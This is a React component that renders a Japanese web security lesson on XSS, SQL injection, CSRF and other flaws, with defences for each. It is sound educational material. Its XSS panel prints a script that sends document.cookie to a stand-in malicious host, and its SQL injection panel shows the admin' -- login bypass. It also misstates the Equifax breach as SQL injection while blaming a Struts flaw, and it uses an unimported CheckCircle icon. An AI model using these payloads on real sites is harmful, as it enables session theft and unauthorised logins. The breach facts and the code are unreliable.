
import React from 'react';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from '@/components/ui/accordion';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Shield, AlertTriangle, Database, AlertCircle, FileCode, Lock, Server } from 'lucide-react';

const SecurityEducation: React.FC = () => {
  return (
    <Card className="shadow-sm bg-white mt-8">
      <CardHeader>
        <CardTitle className="text-xl">セキュリティ脆弱性について</CardTitle>
        <CardDescription>
          ウェブセキュリティの主要な脆弱性とその対策について学びましょう
        </CardDescription>
      </CardHeader>
      <CardContent>
        <Accordion type="single" collapsible className="w-full">
          <AccordionItem value="xss">
            <AccordionTrigger className="flex items-center">
              <div className="flex items-center gap-2">
                <AlertTriangle className="h-5 w-5 text-orange-500" />
                <span>クロスサイトスクリプティング（XSS）</span>
              </div>
            </AccordionTrigger>
            <AccordionContent>
              <div className="space-y-4">
                <div>
                  <h4 className="font-semibold">概要:</h4>
                  <p className="mt-1">
                    クロスサイトスクリプティング（XSS）は、攻撃者がウェブページに悪意のあるクライアント側スクリプトを注入することを可能にする脆弱性です。
                  </p>
                </div>
                
                <div>
                  <h4 className="font-semibold">攻撃シナリオ:</h4>
                  <div className="mt-2 p-4 bg-gray-50 rounded-lg border border-gray-200 relative overflow-hidden">
                    <div className="flex flex-col">
                      <div className="mb-3">
                        <h5 className="text-sm font-medium">1. 攻撃者は脆弱なウェブサイトを見つける</h5>
                        <div className="flex items-start gap-3 mt-1">
                          <div className="bg-red-100 rounded-full p-1.5">
                            <AlertTriangle className="h-4 w-4 text-red-600" />
                          </div>
                          <div className="text-xs text-gray-600">
                            <p>攻撃者は、検索フォームやコメント機能など、ユーザー入力を適切にエスケープせずに表示するサイトを特定します。</p>
                          </div>
                        </div>
                      </div>
                      
                      <div className="mb-3">
                        <h5 className="text-sm font-medium">2. 攻撃者が悪意のあるスクリプトを注入</h5>
                        <div className="flex items-start gap-3 mt-1">
                          <div className="bg-orange-100 rounded-full p-1.5">
                            <FileCode className="h-4 w-4 text-orange-600" />
                          </div>
                          <div className="text-xs">
                            <p>攻撃者は次のようなJavaScriptコードを送信します:</p>
                            <pre className="bg-gray-100 p-2 rounded mt-1 overflow-x-auto">
                              <code>&lt;script&gt;fetch('https://悪意のあるサイト.com/steal?cookie=' + document.cookie);&lt;/script&gt;</code>
                            </pre>
                          </div>
                        </div>
                      </div>
                      
                      <div>
                        <h5 className="text-sm font-medium">3. 被害者がスクリプトを実行</h5>
                        <div className="flex items-start gap-3 mt-1">
                          <div className="bg-blue-100 rounded-full p-1.5">
                            <Lock className="h-4 w-4 text-blue-600" />
                          </div>
                          <div className="text-xs text-gray-600">
                            <p>ユーザーが脆弱なページを訪問すると、ブラウザは悪意のあるスクリプトを自動的に実行し、セッションクッキーや個人情報が攻撃者に送信されます。</p>
                          </div>
                        </div>
                      </div>
                    </div>
                    
                    {/* Visual representation of XSS attack */}
                    <div className="mt-4 border-t pt-3">
                      <h5 className="text-xs font-medium mb-2 text-center">XSS攻撃の視覚化</h5>
                      <div className="flex justify-center">
                        <div className="relative h-[120px] w-full max-w-md">
                          {/* Attacker */}
                          <div className="absolute top-0 left-0 w-24 text-center">
                            <div className="bg-red-100 rounded-full p-2 mx-auto w-10 h-10 flex items-center justify-center">
                              <AlertTriangle className="h-5 w-5 text-red-500" />
                            </div>
                            <p className="text-xs mt-1">攻撃者</p>
                          </div>
                          
                          {/* Website */}
                          <div className="absolute top-[40px] left-[50%] transform -translate-x-1/2 w-28 text-center">
                            <div className="bg-gray-100 rounded-lg p-2 mx-auto w-16 h-10 flex items-center justify-center">
                              <Server className="h-5 w-5 text-gray-500" />
                            </div>
                            <p className="text-xs mt-1">脆弱なサイト</p>
                          </div>
                          
                          {/* Victim */}
                          <div className="absolute top-0 right-0 w-24 text-center">
                            <div className="bg-blue-100 rounded-full p-2 mx-auto w-10 h-10 flex items-center justify-center">
                              <Lock className="h-5 w-5 text-blue-500" />
                            </div>
                            <p className="text-xs mt-1">被害者</p>
                          </div>
                          
                          {/* Attack flow arrows */}
                          <svg className="absolute inset-0 w-full h-full" xmlns="http://www.w3.org/2000/svg">
                            {/* Attacker to Website */}
                            <path d="M35,30 L130,50" stroke="#f87171" strokeWidth="2" fill="none" markerEnd="url(#arrowhead)" />
                            
                            {/* Website to Victim */}
                            <path d="M160,50 L255,30" stroke="#60a5fa" strokeWidth="2" fill="none" markerEnd="url(#arrowhead)" />
                            
                            {/* Victim data to Attacker */}
                            <path d="M255,30 C200,100 150,100 35,30" stroke="#ef4444" strokeWidth="2" strokeDasharray="4" fill="none" markerEnd="url(#arrowhead)" />
                            
                            {/* Define the arrowhead */}
                            <defs>
                              <marker id="arrowhead" markerWidth="10" markerHeight="7" refX="9" refY="3.5" orient="auto">
                                <polygon points="0 0, 10 3.5, 0 7" />
                              </marker>
                            </defs>
                          </svg>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                
                <div>
                  <h4 className="font-semibold">主な種類:</h4>
                  <ul className="list-disc pl-5 text-sm mt-1">
                    <li><span className="font-medium">反射型XSS:</span> 悪意のあるスクリプトが、リクエストの一部としてサーバーに送信され、サーバーの応答内で「反射」されます。</li>
                    <li><span className="font-medium">格納型XSS:</span> 悪意のあるスクリプトがデータベースに保存され、そのデータが他のユーザーに表示されるたびに実行されます。</li>
                    <li><span className="font-medium">DOM型XSS:</span> クライアント側のJavaScriptがDOMを動的に変更することにより発生します。</li>
                  </ul>
                </div>
                
                <div>
                  <h4 className="font-semibold">実際の攻撃例:</h4>
                  <div className="bg-red-50 p-3 rounded-md border border-red-200 mt-1">
                    <p className="text-sm">2018年、英国の航空会社British Airwaysのウェブサイトは、決済ページに悪意のあるスクリプトが注入されるXSS攻撃を受けました。このスクリプトは、顧客のクレジットカード情報を収集し、外部サーバーに送信していました。この攻撃により、約38万人の顧客の個人情報とクレジットカード情報が漏洩しました。</p>
                  </div>
                </div>
                
                <div>
                  <h4 className="font-semibold">影響:</h4>
                  <p className="text-sm">
                    XSS攻撃は、ユーザーのクッキー（セッションID）の盗難、偽のWebページの表示、ユーザーのブラウザでの不正なアクションの実行などを可能にします。
                  </p>
                </div>
                
                <div>
                  <h4 className="font-semibold">対策:</h4>
                  <ul className="list-disc pl-5 text-sm mt-1">
                    <li>ユーザー入力のすべてをエスケープする</li>
                    <li>Content Security Policy（CSP）を実装する</li>
                    <li>HttpOnly属性を使用してクッキーを保護する</li>
                    <li>入力検証と出力エンコーディングを実装する</li>
                  </ul>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="sqli">
            <AccordionTrigger className="flex items-center">
              <div className="flex items-center gap-2">
                <Database className="h-5 w-5 text-red-500" />
                <span>SQLインジェクション</span>
              </div>
            </AccordionTrigger>
            <AccordionContent>
              <div className="space-y-4">
                <div>
                  <h4 className="font-semibold">概要:</h4>
                  <p className="mt-1">
                    SQLインジェクションは、アプリケーションがユーザー入力をデータベースクエリに安全でない方法で組み込む場合に発生する脆弱性です。
                  </p>
                </div>
                
                <div>
                  <h4 className="font-semibold">攻撃シナリオ:</h4>
                  <div className="mt-2 p-4 bg-gray-50 rounded-lg border border-gray-200 relative overflow-hidden">
                    <div className="flex flex-col">
                      <div className="mb-3">
                        <h5 className="text-sm font-medium">1. 脆弱なログインフォームの特定</h5>
                        <div className="flex items-start gap-3 mt-1">
                          <div className="bg-red-100 rounded-full p-1.5">
                            <Database className="h-4 w-4 text-red-600" />
                          </div>
                          <div className="text-xs text-gray-600">
                            <p>通常のログインフォームは以下のようなSQLクエリを実行します:</p>
                            <pre className="bg-gray-100 p-2 rounded mt-1 overflow-x-auto">
                              <code>SELECT * FROM users WHERE username = 'ユーザー入力' AND password = 'パスワード入力'</code>
                            </pre>
                          </div>
                        </div>
                      </div>
                      
                      <div className="mb-3">
                        <h5 className="text-sm font-medium">2. 攻撃者がSQLインジェクション攻撃を実行</h5>
                        <div className="flex items-start gap-3 mt-1">
                          <div className="bg-orange-100 rounded-full p-1.5">
                            <FileCode className="h-4 w-4 text-orange-600" />
                          </div>
                          <div className="text-xs">
                            <p>攻撃者はユーザー名フィールドに次のように入力します:</p>
                            <pre className="bg-gray-100 p-2 rounded mt-1 overflow-x-auto">
                              <code>admin' --</code>
                            </pre>
                            <p className="mt-1">SQLクエリは次のように変わります:</p>
                            <pre className="bg-gray-100 p-2 rounded mt-1 overflow-x-auto">
                              <code>SELECT * FROM users WHERE username = 'admin' --' AND password = 'パスワード入力'</code>
                            </pre>
                            <p className="mt-1">「--」はSQL文のコメント記号であるため、以降の条件（パスワードチェック）が無視されます。</p>
                          </div>
                        </div>
                      </div>
                      
                      <div>
                        <h5 className="text-sm font-medium">3. 認証のバイパス</h5>
                        <div className="flex items-start gap-3 mt-1">
                          <div className="bg-purple-100 rounded-full p-1.5">
                            <Lock className="h-4 w-4 text-purple-600" />
                          </div>
                          <div className="text-xs text-gray-600">
                            <p>攻撃者はパスワードなしで「admin」ユーザーとしてログインできます。より高度な攻撃では、データベース全体のダンプ、テーブルの削除、管理者権限の取得なども可能です。</p>
                          </div>
                        </div>
                      </div>
                    </div>
                    
                    {/* Visual representation of SQL injection */}
                    <div className="mt-4 border-t pt-3">
                      <h5 className="text-xs font-medium mb-2 text-center">SQLインジェクション攻撃の視覚化</h5>
                      <div className="flex flex-col items-center">
                        <div className="w-full max-w-md p-3 bg-white border border-gray-200 rounded-lg">
                          <div className="text-xs font-medium mb-2">ログインフォーム</div>
                          <div className="grid grid-cols-2 gap-2 mb-2">
                            <div className="text-xs text-gray-500">ユーザー名:</div>
                            <div className="text-xs font-mono bg-red-50 p-1 rounded">admin' --</div>
                            <div className="text-xs text-gray-500">パスワード:</div>
                            <div className="text-xs font-mono bg-gray-50 p-1 rounded">何でも良い</div>
                          </div>
                        </div>
                        
                        <div className="h-6 w-0.5 bg-gray-200 my-2"></div>
                        
                        <div className="w-full max-w-md p-3 bg-gray-50 border border-gray-200 rounded-lg">
                          <div className="text-xs font-medium mb-2">データベースに送信されるSQL</div>
                          <div className="text-xs font-mono bg-gray-100 p-2 rounded overflow-x-auto whitespace-pre-wrap">
                            <span>SELECT * FROM users WHERE username = '</span>
                            <span className="text-red-500 font-bold">admin' --</span>
                            <span className="text-gray-400">' AND password = '何でも良い'</span>
                          </div>
                        </div>
                        
                        <div className="h-6 w-0.5 bg-gray-200 my-2"></div>
                        
                        <div className="w-full max-w-md p-3 bg-green-50 border border-green-200 rounded-lg">
                          <div className="text-xs font-medium mb-2">結果</div>
                          <div className="flex items-center gap-2">
                            <div className="bg-green-100 rounded-full p-1">
                              <CheckCircle className="h-4 w-4 text-green-500" />
                            </div>
                            <div className="text-xs text-green-700">認証バイパス成功！adminとしてログインしました。</div>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
                                
                <div>
                  <h4 className="font-semibold">実際の攻撃例:</h4>
                  <div className="bg-red-50 p-3 rounded-md border border-red-200 mt-1">
                    <p className="text-sm">2017年、世界最大級の信用情報機関であるEquifaxは、SQLインジェクションの脆弱性を突かれ、約1億4,700万人の個人情報（社会保障番号、生年月日、住所など）が流出しました。この攻撃は、適切にパッチが適用されていなかったApache Strutsフレームワークの脆弱性を通じて実行されました。</p>
                  </div>
                </div>
                
                <div>
                  <h4 className="font-semibold">影響:</h4>
                  <p className="text-sm">
                    SQLインジェクションにより、データベース内のデータを読み取る、変更する、削除する、データベース管理システムのファイルシステムにアクセスするなどの不正操作が可能になる場合があります。
                  </p>
                </div>
                
                <div>
                  <h4 className="font-semibold">対策:</h4>
                  <ul className="list-disc pl-5 text-sm mt-1">
                    <li>パラメータ化クエリまたはプリペアドステートメントを使用する</li>
                    <li>ORM（オブジェクト・リレーショナル・マッピング）フレームワークを使用する</li>
                    <li>データベースユーザーに必要最小限の権限を付与する</li>
                    <li>入力検証を実装する</li>
                    <li>データベースからのエラーメッセージを詳細に表示しない</li>
                  </ul>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="csrf">
            <AccordionTrigger className="flex items-center">
              <div className="flex items-center gap-2">
                <AlertCircle className="h-5 w-5 text-yellow-500" />
                <span>クロスサイトリクエストフォージェリ（CSRF）</span>
              </div>
            </AccordionTrigger>
            <AccordionContent>
              <div className="space-y-3">
                <p>
                  CSRFは、認証済みのユーザーが知らないうちに不正なHTTPリクエストを送信させる攻撃です。
                </p>
                <div>
                  <h4 className="font-semibold">攻撃の動作:</h4>
                  <ol className="list-decimal pl-5 text-sm mt-1">
                    <li>ユーザーが認証済みのサイトにログインしています</li>
                    <li>攻撃者は悪意のあるWebサイトへのリンクをユーザーに送信します</li>
                    <li>ユーザーが悪意のあるサイトを訪問すると、そのサイトは認証済みサイトに対して自動的にリクエストを送信します</li>
                    <li>認証済みサイトはクッキーを確認し、リクエストを信頼してしまいます</li>
                  </ol>
                </div>
                <div>
                  <h4 className="font-semibold">影響:</h4>
                  <p className="text-sm">
                    CSRF攻撃により、攻撃者はユーザーの権限を使用して、パスワードの変更、メールアドレスの変更、資金の送金など、重要なアクションを実行することができます。
                  </p>
                </div>
                <div>
                  <h4 className="font-semibold">対策:</h4>
                  <ul className="list-disc pl-5 text-sm mt-1">
                    <li>CSRFトークンを実装する</li>
                    <li>Same-Site Cookieを使用する</li>
                    <li>重要なアクションには追加の認証を要求する</li>
                    <li>リファラーヘッダーを確認する</li>
                    <li>カスタムリクエストヘッダーを使用する</li>
                  </ul>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>

          <AccordionItem value="other">
            <AccordionTrigger className="flex items-center">
              <div className="flex items-center gap-2">
                <Shield className="h-5 w-5 text-blue-500" />
                <span>その他の一般的な脆弱性</span>
              </div>
            </AccordionTrigger>
            <AccordionContent>
              <div className="space-y-4">
                <div>
                  <h4 className="font-semibold">安全でない認証と認可</h4>
                  <p className="text-sm mt-1">
                    脆弱なパスワードポリシー、多要素認証の欠如、不適切なセッション管理などの問題があります。
                  </p>
                  <p className="text-sm mt-1 font-medium">対策:</p>
                  <ul className="list-disc pl-5 text-xs">
                    <li>強力なパスワードポリシーを実装する</li>
                    <li>多要素認証を提供する</li>
                    <li>適切なセッション管理を実装する</li>
                  </ul>
                </div>

                <div>
                  <h4 className="font-semibold">機密データの露出</h4>
                  <p className="text-sm mt-1">
                    適切な暗号化なしでの機密データの保存や転送が問題となります。
                  </p>
                  <p className="text-sm mt-1 font-medium">対策:</p>
                  <ul className="list-disc pl-5 text-xs">
                    <li>転送中のデータにはHTTPSを使用する</li>
                    <li>保存データを適切に暗号化する</li>
                    <li>機密情報のキャッシュを最小限に抑える</li>
                  </ul>
                </div>

                <div>
                  <h4 className="font-semibold">XMLエンティティインジェクション（XXE）</h4>
                  <p className="text-sm mt-1">
                    XML外部エンティティが有効な場合、攻撃者はサーバー上のファイルやサービスにアクセスできる可能性があります。
                  </p>
                  <p className="text-sm mt-1 font-medium">対策:</p>
                  <ul className="list-disc pl-5 text-xs">
                    <li>XMLパーサーで外部エンティティを無効にする</li>
                    <li>可能であればJSONなどの単純なデータ形式を使用する</li>
                  </ul>
                </div>

                <div>
                  <h4 className="font-semibold">ブロークンアクセス制御</h4>
                  <p className="text-sm mt-1">
                    ユーザーが権限を持たないリソースにアクセスできる場合に発生します。
                  </p>
                  <p className="text-sm mt-1 font-medium">対策:</p>
                  <ul className="list-disc pl-5 text-xs">
                    <li>各リクエストで適切な認可チェックを実装する</li>
                    <li>最小権限の原則を適用する</li>
                    <li>APIエンドポイントを適切に保護する</li>
                  </ul>
                </div>
              </div>
            </AccordionContent>
          </AccordionItem>
        </Accordion>
      </CardContent>
    </Card>
  );
};

export default SecurityEducation;
